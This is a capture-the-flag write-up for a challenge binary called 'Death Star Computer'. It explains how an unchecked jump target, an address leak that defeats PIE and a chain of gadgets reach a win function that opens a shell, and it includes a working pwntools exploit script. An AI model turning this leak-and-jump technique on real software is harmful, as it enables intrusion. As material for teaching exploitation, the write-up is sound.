# Death Star Computer

## Solution

This challenge first gives the ability to enter target coordinates. If a value of `1` through `7` is selected, the target is set to a specific function. If a different value is selected, the target is set to whatever value is typed. Then, you can call the fire command, which causes the program to jump to the target.

Because there is no bounds checks on selecting a target, we could enter an address in the binary instead of a normal number and jump to wherever we want! The binary contains a win function:
```
0000154c      int64_t var_10 = '/bin/sh'
00001554      char** rdx
00001554      char** rsi
00001554      int32_t rdi
00001554      if (arg1 != 0x56)
00001554          return main(argc: rdi, argv: rsi, envp: rdx) __tailcall
0000155e      if (arg2 != 0x4b)
0000155e          return main(argc: rdi, argv: rsi, envp: rdx) __tailcall
0000156b      if (arg3 != 0x135)
0000156b          return main(argc: rdi, argv: rsi, envp: rdx) __tailcall
0000157f      return system(line: &var_10)
```
In order for the win function to be useful, we have to set three arguments to particular values. Luckily, upon short inspection of the binary, we notice that it contains gadgets that set the arguments to these values. Thus, we need to use the previous exploit to jump to these three gadgets, then jump to the win function to get a shell.

There is only one more issue left to deal with. The binary has PIE enabled. To bypass this, we need to use the third menu command, which prints the current target. Thus, we put in a number between `1` and `7`, which loads in a predefined function. Then, we print this address to determine the base address of the binary.

After all of this, the exploit looks like this:
```python
p = start()

def get_offset():
    log.info("Getting offset...")
    p.sendlineafter(b'Fire', b'1')
    p.sendlineafter(b'BESPIN', b'1')
    p.sendlineafter(b'Fire', b'2')
    p.recvuntil(b'=> ')
    leak = int(p.recvuntil('--')[:-2].strip())
    log.info(f"Got leak of {hex(leak)}")
    e.address = leak - 0x1355

def jump_to(addr):
    log.info(f"Jumping to {hex(addr)}")
    p.sendlineafter(b'Fire', b'1')
    p.sendlineafter(b'BESPIN', str(addr).encode('utf-8'))
    p.sendlineafter(b'Fire', b'3')

get_offset()
jump_to(e.address + 0x151f)
jump_to(e.address + 0x1527)
jump_to(e.address + 0x152f)
jump_to(e.address + 0x153a)

p.interactive()
```